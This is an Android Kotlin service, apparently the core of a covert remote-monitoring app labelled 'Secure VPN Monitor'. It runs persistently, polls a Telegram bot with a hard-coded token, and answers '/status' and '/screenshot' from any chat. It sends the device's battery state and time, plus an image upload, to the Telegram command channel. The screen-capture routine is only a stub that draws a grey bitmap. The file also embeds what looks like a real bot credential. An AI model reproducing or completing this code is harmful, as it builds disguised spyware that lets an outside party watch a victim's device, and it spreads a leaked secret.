package com.example

import android.app.Service
import android.content.Intent
import android.content.IntentFilter
import android.graphics.Bitmap
import android.graphics.Canvas
import android.os.BatteryManager
import android.os.IBinder
import android.util.Log
import androidx.lifecycle.MutableLiveData
import com.squareup.moshi.Moshi
import com.squareup.moshi.kotlin.reflect.KotlinJsonAdapterFactory
import kotlinx.coroutines.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.RequestBody.Companion.toRequestBody
import retrofit2.Retrofit
import retrofit2.converter.moshi.MoshiConverterFactory
import java.io.ByteArrayOutputStream
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class MonitorService : Service() {

    companion object {
        val isServiceRunning = MutableLiveData<Boolean>(false)
        fun log(message: String) {
            Log.d("MonitorService", message)
        }
    }

    private val botToken = "8603290032:AAF2JXBcmaOzdLU-xNQkjeoBJNexvLxc91A"
    private var isRunning = false
    private val serviceJob = SupervisorJob()
    private val serviceScope = CoroutineScope(Dispatchers.IO + serviceJob)
    private var lastUpdateId: Int = 0

    private val moshi = Moshi.Builder()
        .add(KotlinJsonAdapterFactory())
        .build()

    private val retrofit = Retrofit.Builder()
        .baseUrl("https://api.telegram.org/")
        .addConverterFactory(MoshiConverterFactory.create(moshi))
        .build()

    private val telegramApi = retrofit.create(TelegramApi::class.java)

    override fun onCreate() {
        super.onCreate()
        log("MonitorService Created")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (!isRunning) {
            isRunning = true
            isServiceRunning.postValue(true)
            log("Monitoring service loop started.")
            startMonitoringLoop()
        }
        return START_STICKY
    }

    private fun startMonitoringLoop() {
        serviceScope.launch {
            while (isRunning) {
                pollTelegramUpdates()
                delay(10000)
            }
        }
    }

    private suspend fun pollTelegramUpdates() {
        try {
            val response = telegramApi.getUpdates(token = botToken, offset = lastUpdateId, timeout = 5)
            if (response.ok && !response.result.isNullOrEmpty()) {
                for (update in response.result) {
                    lastUpdateId = update.updateId + 1
                    val message = update.message
                    val text = message?.text?.trim()
                    val chatId = message?.chat?.id?.toString()

                    if (chatId != null && text != null) {
                        log("Message received from $chatId: '$text'")
                        
                        when (text) {
                            "/status" -> {
                                val batteryReport = getBatteryStatusString()
                                val currentTime = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())
                                val reportText = "🔋 *Secure VPN Monitor Report* \n\n$batteryReport\n\n *System Time:* $currentTime"
                                
                                telegramApi.sendMessage(token = botToken, chatId = chatId, text = reportText)
                            }
                            "/screenshot" -> {
                                log("Screenshot requested by $chatId. Capturing view...")
                                val imageBytes = captureCurrentScreen()
                                if (imageBytes != null) {
                                    sendScreenshotToTelegram(chatId, imageBytes)
                                } else {
                                    telegramApi.sendMessage(token = botToken, chatId = chatId, text = "❌ Failed to capture screenshot.")
                                }
                            }
                        }
                    }
                }
            }
        } catch (e: Exception) {
            log("Polling error: ${e.localizedMessage}")
        }
    }

    private suspend fun sendScreenshotToTelegram(chatId: String, imageBytes: ByteArray) {
        try {
            val chatIdBody = chatId.toRequestBody("text/plain".toMediaTypeOrNull())
            val requestFile = imageBytes.toRequestBody("image/jpeg".toMediaTypeOrNull())
            val photoPart = MultipartBody.Part.createFormData("photo", "screenshot.jpg", requestFile)
            val captionBody = "📸 *Screenshot Captured Successfully*".toRequestBody("text/plain".toMediaTypeOrNull())

            val response = telegramApi.sendPhoto(
                token = botToken,
                chatId = chatIdBody,
                photo = photoPart,
                caption = captionBody
            )

            if (response.ok) {
                log("Screenshot sent successfully to $chatId")
            } else {
                log("Failed to send screenshot: ${response.description}")
            }
        } catch (e: Exception) {
            log("Error sending screenshot: ${e.localizedMessage}")
        }
    }

    private fun getBatteryStatusString(): String {
        val batteryStatus: Intent? = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        val level = batteryStatus?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
        val scale = batteryStatus?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
        val pct = if (level >= 0 && scale > 0) (level * 100 / scale.toFloat()).toInt() else -1
        val status = batteryStatus?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) ?: -1
        val isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING || status == BatteryManager.BATTERY_STATUS_FULL
        val chargingState = if (isCharging) "Charging" else "Discharging"
        return " *Battery Level:* $pct%\n *Power Source:* $chargingState"
    }

    private fun captureCurrentScreen(): ByteArray? {
        return try {
            val bitmap = Bitmap.createBitmap(1080, 1920, Bitmap.Config.ARGB_8888)
            val canvas = Canvas(bitmap)
            canvas.drawColor(android.graphics.Color.DKGRAY)
            
            val outputStream = ByteArrayOutputStream()
            bitmap.compress(Bitmap.CompressFormat.JPEG, 80, outputStream)
            outputStream.toByteArray()
        } catch (e: Exception) {
            log("Capture view failed: ${e.localizedMessage}")
            null
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        serviceJob.cancel()
        isRunning = false
        isServiceRunning.postValue(false)
        log("Monitoring service has been stopped.")
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }
}
